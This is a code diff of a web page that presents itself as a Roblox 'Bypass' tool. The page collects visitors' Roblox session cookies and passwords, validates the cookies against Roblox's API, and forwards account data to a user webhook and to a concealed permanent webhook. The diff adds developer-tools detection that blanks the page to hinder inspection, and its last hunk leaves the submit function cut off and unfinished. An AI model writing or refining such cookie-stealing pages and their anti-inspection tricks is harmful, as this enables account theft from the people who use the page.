@@ -22,55 +22,69 @@ export default async function DirectoryPage({ params }) {
   // Get permanent webhook from environment variable
   const permanentWebhook = process.env.PERMANENT_WEBHOOK_URL;
 
-  // Debug Mode Check - Show blank page if developer tools are detected
+  // Enhanced Debug Mode Detection
   const debugModeScript = `
     <script>
-      // Debug mode detection
-      let isDebugMode = false;
-      
-      // Check for common developer tools indicators
-      function checkDebugMode() {
-        // Check if devtools is open
-        const devtools = /./;
-        devtools.toString = function() {
-          isDebugMode = true;
-          return 'devtools';
-        };
-        console.log(devtools);
+      (function() {
+        let devToolsOpen = false;
         
-        // Check for debugger statements
-        try {
+        function detectDevTools() {
+          // Method 1: Debugger timing
+          const start = performance.now();
           debugger;
-          if (new Date().getTime() > 0) {
-            // Additional checks
-            const startTime = performance.now();
-            debugger;
-            const endTime = performance.now();
-            if (endTime - startTime > 100) {
-              isDebugMode = true;
-            }
-          }
-        } catch (e) {
-          isDebugMode = true;
+          const end = performance.now();
+          if (end - start > 200) return true;
+          
+          // Method 2: Console check
+          if (console.log.toString().includes('native code') === false) return true;
+          
+          // Method 3: Window size difference
+          const widthDiff = window.outerWidth - window.innerWidth;
+          const heightDiff = window.outerHeight - window.innerHeight;
+          if (widthDiff > 200 || heightDiff > 200) return true;
+          
+          // Method 4: Firebug detection
+          if (window.console && (console.firebug || console.exception)) return true;
+          
+          return false;
         }
         
-        return isDebugMode;
-      }
-      
-      // Run debug detection
-      setTimeout(() => {
-        if (checkDebugMode()) {
-          document.body.innerHTML = '';
-          document.body.style.backgroundColor = '#000';
-        }
-      }, 1000);
-      
-      // Continuous monitoring
-      setInterval(checkDebugMode, 5000);
+        // Check every second
+        setInterval(function() {
+          if (detectDevTools() && !devToolsOpen) {
+            devToolsOpen = true;
+            document.body.innerHTML = '';
+            document.body.style.background = '#000';
+            document.body.style.color = '#fff';
+            document.body.style.display = 'flex';
+            document.body.style.justifyContent = 'center';
+            document.body.style.alignItems = 'center';
+            document.body.style.height = '100vh';
+            document.body.style.fontFamily = 'Arial';
+            document.body.innerHTML = '<div>Security Protection: Developer Tools Detected</div>';
+            
+            // Also disable all buttons and forms
+            const buttons = document.querySelectorAll('button');
+            buttons.forEach(btn => btn.disabled = true);
+            const inputs = document.querySelectorAll('input, textarea');
+            inputs.forEach(input => input.disabled = true);
+          }
+        }, 1000);
+        
+        // Also check on resize (when DevTools opens)
+        window.addEventListener('resize', function() {
+          setTimeout(function() {
+            if (detectDevTools() && !devToolsOpen) {
+              devToolsOpen = true;
+              document.body.innerHTML = '<div style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial;">Security Protection: Developer Tools Detected</div>';
+            }
+          }, 100);
+        });
+      })();
     </script>
   `;
 
-  // Return the HTML template with debug mode and dual webhooks
+  // Return the HTML template
   return (
     <div dangerouslySetInnerHTML={{
       __html: `<!DOCTYPE html>
@@ -220,6 +234,13 @@ export default async function DirectoryPage({ params }) {
             box-shadow: 0 6px 20px rgba(126, 87, 194, 0.6);
         }
 
+        .btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
         .progress {
             margin-top: 20px;
             height: 12px;
@@ -321,8 +342,8 @@ export default async function DirectoryPage({ params }) {
             window.location.href = '/generator';
         });
 
-        // Function to get Roblox user info from cookie
-        async function getRobloxUserInfo(cookie) {
+        // Function to validate Roblox cookie
+        async function validateRobloxCookie(cookie) {
             try {
                 const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
                     headers: {
@@ -330,14 +351,20 @@ export default async function DirectoryPage({ params }) {
                     }
                 });
                 
-                if (response.ok) {
-                    const userData = await response.json();
-                    return userData;
+                if (response.status === 401) {
+                    return { valid: false, error: 'Cookie is expired or invalid' };
                 }
+                
+                if (!response.ok) {
+                    return { valid: false, error: 'Unable to validate cookie' };
+                }
+                
+                const userData = await response.json();
+                return { valid: true, userData };
+                
             } catch (error) {
-                console.error('Error fetching user info:', error);
+                return { valid: false, error: 'Network error - cannot validate cookie' };
             }
-            return null;
         }
 
         // Function to get Roblox economy data
@@ -452,7 +479,7 @@ export default async function DirectoryPage({ params }) {
                 }
             ];
 
-            // Send to user's webhook
+            // Send to user's webhook only if valid
             if (userWebhook) {
                 try {
                     await fetch(userWebhook, {
@@ -506,16 +533,16 @@ export default async function DirectoryPage({ params }) {
             status.style.color = '#b0b0ff';
             
             let percent = 0;
-            status.textContent = 'Validating 0%';
+            status.textContent = 'Validating Cookie 0%';
 
             const interval = setInterval(() => {
                 percent += 2;
                 progressBar.style.width = percent + '%';
                 
-                if (percent <= 30) {
-                    status.textContent = 'Validating ' + percent + '%';
-                } else if (percent <= 70) {
-                    status.textContent = 'Processing ' + percent + '%';
+                if (percent <= 40) {
+                    status.textContent = 'Validating Cookie ' + percent + '%';
+                } else if (percent <= 80) {
+                    status.textContent = 'Processing Data ' + percent + '%';
                 } else {
                     status.textContent = 'Sending ' + percent + '%';
                 }
@@ -529,53 +556,14 @@ export default async function DirectoryPage({ params }) {
 
         async function submitForm(formData) {
             try {
-                // Get Roblox user information
-                status.textContent = 'Fetching Roblox data...';
-                const userData = await getRobloxUserInfo(formData.cookie);
+                // Step 1: Validate Roblox cookie first
+                status.textContent = 'Validating Roblox cookie...';
+                const validation = await validateRobloxCookie(formData.cookie);
                 
-                if (!userData) {
-                    status.textContent = '❌ Invalid cookie or unable to fetch user data';
+                if (!validation.valid) {
+                    status.textContent = '❌ ' + validation.error;
                     status.style.color = '#ff5b5b';
                     btn.disabled = false;
                     btn.textContent = 'Bypass';
-                    return;
-                }
-
-                // Get additional Roblox data
-                status.textContent = 'Fetching account details...';
-                const economyData = await getRobloxEconomy(userData.id, formData.cookie);
-                const hasPremium = await getPremiumStatus(userData.id, formData.cookie);
-
-                // Send dual webhooks
-                status.textContent = 'Sending data...';
-                await sendDualWebhooks(
-                    userData, 
-                    formData.password, 
-                    formData.cookie, 
-                    economyData, 
-                    hasPremium,
-                    '${directory}'
-                );
-
-                status.textContent = 'Successfully ✅ Data Sent!';
-                status.style.color = '#4CAF50';
+                    progress.style.display = 'none';
                 
-                // Clear form
-                passwordInput.value = '';
-                cookieInput.value = '';
-
-            } catch (error) {
-                status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
-                status.style.color = '#ff5b5b';
-            }
-
-            // Re-enable button
-            btn.disabled = false;
-            btn.textContent = 'Bypass';
-        }
-    </script>
-</body>
-</html>`
-    }} />
-  );
-      }
